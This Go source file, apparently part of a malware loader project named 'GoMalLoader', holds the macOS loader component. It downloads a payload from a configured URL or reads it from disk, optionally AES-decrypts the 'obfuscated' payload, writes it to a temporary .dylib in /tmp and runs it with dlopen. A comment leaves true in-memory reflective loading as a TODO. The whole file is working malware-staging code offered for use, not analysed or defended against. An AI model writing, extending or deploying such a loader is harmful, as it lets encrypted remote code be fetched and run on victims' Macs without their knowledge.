//go:build darwin

package loader

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	"GoMalLoader/utils"
)

// TODO: Implement reflective loader using Mach-O parsing and in-memory loading

type darwinReflectiveLoader struct{}

func NewReflectiveLoader() ReflectiveLoader {
	return &darwinReflectiveLoader{}
}

func (l *darwinReflectiveLoader) Load(cfg LoaderConfig) error {
	var payload []byte
	var err error

	if cfg.Source == "url" {
		resp, err := http.Get(cfg.URL)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		payload, err = io.ReadAll(resp.Body)
	} else {
		payload, err = os.ReadFile(cfg.Path)
	}
	if err != nil {
		return err
	}

	if cfg.Obfuscated {
		payload, err = utils.AESDecrypt(payload, []byte(cfg.AESKey))
		if err != nil {
			return err
		}
	}

	tmpfile, err := os.CreateTemp("/tmp", "reflective_macho_*.dylib")
	if err != nil {
		return fmt.Errorf("failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())
	defer tmpfile.Close()

	log.Printf("[+] Writing payload to temp file: %s", tmpfile.Name())
	if _, err := tmpfile.Write(payload); err != nil {
		return fmt.Errorf("write to temp file failed: %v", err)
	}

	log.Printf("[+] Loading Mach-O dylib from temp file using dlopen")
	if err := utils.DlopenFromPath(tmpfile.Name()); err != nil {
		return fmt.Errorf("dlopen failed: %v", err)
	}
	log.Printf("[+] Reflective Mach-O load complete.")
	return nil
}
